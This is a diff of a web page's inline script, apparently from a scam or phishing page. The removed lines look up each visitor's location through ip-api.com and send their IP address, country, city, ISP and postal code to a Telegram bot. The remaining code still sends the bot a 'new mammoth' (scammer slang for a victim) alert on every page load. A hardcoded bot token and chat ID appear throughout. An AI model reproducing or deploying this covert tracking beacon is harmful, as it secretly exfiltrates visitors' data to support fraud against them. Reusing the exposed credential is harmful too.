@@ -1,13 +1,5 @@
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 <script>
-var requestUrl = "http://ip-api.com/json";
-
-$.ajax({
-  url: requestUrl,
-  type: 'GET',
-  success: function(json)
-  {
-  	var hello = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Новый мамонт!"
+var hello = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Новый мамонт!"
 
 var xhr = new XMLHttpRequest();
 xhr.open("POST", hello);
@@ -95,65 +87,4 @@ xhr.setRequestHeader("Content-Length", "0");
 
 xhr.send();
 
-var ip = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Айпи: "+json.query
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", ip);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-
-var country = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Страна: "+json.country
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", country);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-
-var city = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Город: "+json.city
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", city);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-
-var prov = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Провайдер: "+json.isp
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", prov);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-
-var zip = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Индекс: "+json.zip
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", zip);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-    
-  },
-  error: function(err)
-  {
-    console.log("Request failed, error= " + err);
-  }
-});
-			</script>
+</script>
